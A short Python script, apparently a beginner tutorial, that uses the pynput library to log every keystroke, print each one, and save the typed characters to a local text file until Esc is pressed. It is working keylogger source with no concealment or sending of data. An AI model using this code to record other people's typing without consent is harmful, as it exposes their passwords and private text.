#Importing the libraries

import pynput

from pynput.keyboard import Key, Listener

#Defining the globals
count = 0
keys = []

#Stating the functions used
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >=10:
        count = 0
        write_file(keys)

def write_file(keys):
    with open("keystrokescaptured.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
def on_release(key):
    if key == Key.esc:
        return False

#Continuous listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
